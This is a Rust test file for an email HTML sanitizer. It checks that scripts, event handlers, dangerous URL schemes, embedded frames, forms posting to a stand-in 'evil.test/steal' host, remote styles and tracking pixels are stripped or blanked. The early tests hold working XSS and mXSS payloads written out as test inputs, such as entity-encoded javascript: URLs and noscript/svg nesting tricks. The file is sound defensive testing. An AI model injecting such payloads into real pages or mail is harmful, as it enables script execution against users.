//! Sanitizer tests with hostile input. Each case asserts what must NOT
//! survive, plus a few that legitimate mail keeps working.

use super::*;

fn clean(html: &str) -> String {
    let s = scan(html);
    sanitize(html, &s, Resources::default()).0
}

fn assert_absent(out: &str, needles: &[&str]) {
    let l = out.to_ascii_lowercase();
    for n in needles {
        assert!(!l.contains(&n.to_ascii_lowercase()), "found {n:?} in:\n{out}");
    }
}

#[test]
fn scripts_and_handlers_are_removed() {
    let out = clean(
        r#"<p onclick="alert(1)">hi</p><script>alert(2)</script><img src=x onerror=alert(3)>
           <svg onload=alert(4)><script>alert(5)</script></svg><body onload=alert(6)>
           <a href="javascript:alert(7)">x</a><a href=" JaVaScRiPt:alert(8)">y</a>
           <a href="vbscript:msgbox(9)">z</a><a href="data:text/html,<script>alert(10)</script>">d</a>"#,
    );
    assert_absent(
        &out,
        &[
            "alert",
            "onclick",
            "onerror",
            "onload",
            "<script",
            "javascript:",
            "vbscript:",
            "data:text",
        ],
    );
    assert!(out.contains("hi"));
}

#[test]
fn active_and_navigational_elements_are_removed() {
    let out = clean(
        r#"<iframe src="https://evil.test"></iframe><object data="x.swf"></object><embed src="x">
           <form action="https://evil.test/steal"><input name=pw><button formaction="https://evil.test">Go</button></form>
           <meta http-equiv="refresh" content="0;url=https://evil.test"><base href="https://evil.test/">
           <link rel=stylesheet href="https://evil.test/x.css"><frameset><frame src="https://evil.test"></frameset>
           <textarea>leak</textarea><applet code=x></applet>"#,
    );
    assert_absent(
        &out,
        &[
            "<iframe",
            "<object",
            "<embed",
            "<form",
            "<input",
            "formaction",
            "<meta",
            "<base",
            "<link",
            "<frame",
            "evil.test",
            "<textarea",
            "<applet",
        ],
    );
    // Button text (often a call to action) survives as plain text.
    assert!(out.contains("Go"));
}

#[test]
fn mxss_and_parser_tricks_stay_inert() {
    let values = Regex::new(r#""[^"]*""#).unwrap();
    for html in [
        r#"<noscript><p title="</noscript><img src=x onerror=alert(1)>">"#,
        r#"<svg><style><img src=x onerror=alert(1)></style></svg>"#,
        r#"<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>"#,
        r#"<a href="&#106;avascript:alert(1)">x</a>"#,
        r#"<a href="java&#x09;script:alert(1)">x</a>"#,
        r#"<img src="x" alt="&quot; onerror=&quot;alert(1)">"#,
        r#"<<script>script>alert(1)<</script>/script>"#,
        r#"<div style="background:url(javascript:alert(1))">x</div>"#,
        r#"<template><script>alert(1)</script></template>"#,
    ] {
        let out = clean(html);
        // Look at markup only: attribute values are escaped text and may
        // legitimately *contain* words like "onerror".
        let markup = values.replace_all(&out, "\"\"").to_ascii_lowercase();
        let l = markup;
        assert!(
            !l.contains("<script") && !l.contains(" onerror=") && !l.contains("javascript:"),
            "{html}\n=> {out}"
        );
    }
}

#[test]
fn remote_images_are_blanked_unless_provided() {
    let html = r#"<img src="https://cdn.shop.test/hero.png" width="600"><img src="cid:logo@x" alt="logo">"#;
    let out = clean(html);
    assert_absent(&out, &["cdn.shop.test", "cid:"]);
    assert!(out.contains(BLANK_GIF));

    let s = scan(html);
    assert_eq!(s.remote, vec!["https://cdn.shop.test/hero.png".to_string()]);
    let mut res = Resources::default();
    res.images.insert(
        "https://cdn.shop.test/hero.png".into(),
        "data:image/png;base64,AAA".into(),
    );
    res.cids.insert("logo@x".into(), "data:image/gif;base64,BBB".into());
    let (out, shown) = sanitize(html, &s, res);
    assert_eq!(shown, 1);
    assert!(
        out.contains("data:image/png;base64,AAA") && out.contains("data:image/gif;base64,BBB"),
        "{out}"
    );
}

#[test]
fn tracking_pixels_are_detected_and_never_loaded() {
    let html = r#"<img src="https://t.mail.test/o/abc" width="1" height="1">
        <img src="https://x.list-manage.com/track/open.php?u=1&amp;id=2">
        <img src="https://ok.test/a.png" style="display:none">
        <img src="https://ok.test/real.png" width="300" height="100">"#;
    let s = scan(html);
    assert_eq!(s.trackers.len(), 3, "{:?}", s.trackers);
    assert_eq!(s.remote, vec!["https://ok.test/real.png".to_string()]);
    // Even if a caller hands us bytes for a tracker, it stays blank.
    let mut res = Resources::default();
    res.images
        .insert("https://t.mail.test/o/abc".into(), "data:image/gif;base64,T".into());
    let (out, shown) = sanitize(html, &s, res);
    assert_eq!(shown, 0);
    assert!(!out.contains("base64,T\""), "{out}");
}

#[test]
fn styles_are_kept_but_cleaned() {
    let html = r#"<style>.x{color:red;background:url(https://evil.test/a.png)} @import url(https://evil.test/b.css);</style>
        <div class="x" style="position:fixed;top:0;color:blue;background-image:url('https://evil.test/c.png')">Hi</div>"#;
    let r = render_html(html, Resources::default(), RenderOptions::default());
    assert_absent(&r.srcdoc, &["evil.test", "position:fixed", "@import"]);
    assert!(r.srcdoc.contains("color:red") && r.srcdoc.contains("color:blue") && r.srcdoc.contains("class=\"x\""));
}

#[test]
fn links_keep_safe_schemes_and_get_noopener() {
    let out = clean(
        r#"<a href="https://bank.test/login" target="_blank">Log in</a> <a href="mailto:a@b.test">mail</a> <a href="/relative">rel</a>"#,
    );
    assert!(out.contains(r#"href="https://bank.test/login""#), "{out}");
    assert!(out.contains("mailto:a@b.test"));
    assert!(out.contains("noopener noreferrer"));
    assert_absent(&out, &["target=", "/relative"]);
}

#[test]
fn document_has_strict_csp_and_pinned_script() {
    let r = render_html("<p>x</p>", Resources::default(), RenderOptions::default());
    assert!(r.srcdoc.contains("default-src 'none'"));
    assert!(r.srcdoc.contains("img-src data:;"));
    assert!(r.srcdoc.contains(&frame_script_csp_hash()));
    assert!(r.srcdoc.contains("dir=\"auto\""));
    // Exactly one script element: ours.
    assert_eq!(r.srcdoc.matches("<script").count(), 1);
}

#[test]
fn app_csp_pins_the_same_frame_script_hash() {
    let conf: serde_json::Value = serde_json::from_str(include_str!("../../tauri.conf.json")).unwrap();
    let script_src = conf["app"]["security"]["csp"]["script-src"].as_str().unwrap();
    assert!(
        script_src.contains(&frame_script_csp_hash()),
        "tauri.conf.json script-src must include {} (the email frame script hash)",
        frame_script_csp_hash()
    );
}

#[test]
fn plain_text_is_escaped_linkified_and_quotes_fold() {
    let r = render_text(
        "Hi <b>there</b>, see https://example.test/a?b=1&c=2.\nمرحبا www.example.test\n> quoted line\n>> deeper\nbye",
        RenderOptions::default(),
    );
    assert!(r.plain_text);
    assert!(r.srcdoc.contains("&lt;b&gt;there&lt;/b&gt;"));
    assert!(
        r.srcdoc
            .contains(r#"<a href="https://example.test/a?b=1&amp;c=2" rel="noopener noreferrer">"#),
        "{}",
        r.srcdoc
    );
    assert!(r.srcdoc.contains(r#"<a href="https://www.example.test""#));
    assert!(r.srcdoc.contains("مرحبا"));
    assert_eq!(r.srcdoc.matches("<blockquote class=\"pm-quote\">").count(), 2);
    assert!(r.srcdoc.contains("dir=\"auto\""));
}

#[test]
fn text_with_markup_like_urls_cannot_inject() {
    let html = text_to_html(r#"https://x.test/"><script>alert(1)</script>"#);
    assert!(!html.contains("<script"), "{html}");
}

#[test]
fn cid_normalization() {
    assert_eq!(normalize_cid("<Part.1@X>"), "part.1@x");
    assert_eq!(normalize_cid("image001.png%40ABC"), "image001.png@abc");
}

#[test]
fn dark_modes() {
    let smart = render_html(
        "<p>x</p>",
        Resources::default(),
        RenderOptions {
            dark: true,
            original_colors: false,
        },
    );
    assert!(smart.srcdoc.contains("invert(1)"));
    let original = render_html(
        "<p>x</p>",
        Resources::default(),
        RenderOptions {
            dark: true,
            original_colors: true,
        },
    );
    assert!(!original.srcdoc.contains("invert(1)"));
    let text = render_text(
        "x",
        RenderOptions {
            dark: true,
            original_colors: false,
        },
    );
    assert!(!text.srcdoc.contains("invert(1)") && text.srcdoc.contains("#e3e3e3"));
}

#[test]
fn rtl_and_huge_input_do_not_panic() {
    let ar = "<p>رمز التحقق الخاص بك هو 123456</p>".repeat(2000);
    let r = render_html(&ar, Resources::default(), RenderOptions::default());
    assert!(r.srcdoc.contains("رمز"));
    let nested = "<div>".repeat(5000) + "x" + &"</div>".repeat(5000);
    let _ = render_html(&nested, Resources::default(), RenderOptions::default());
}
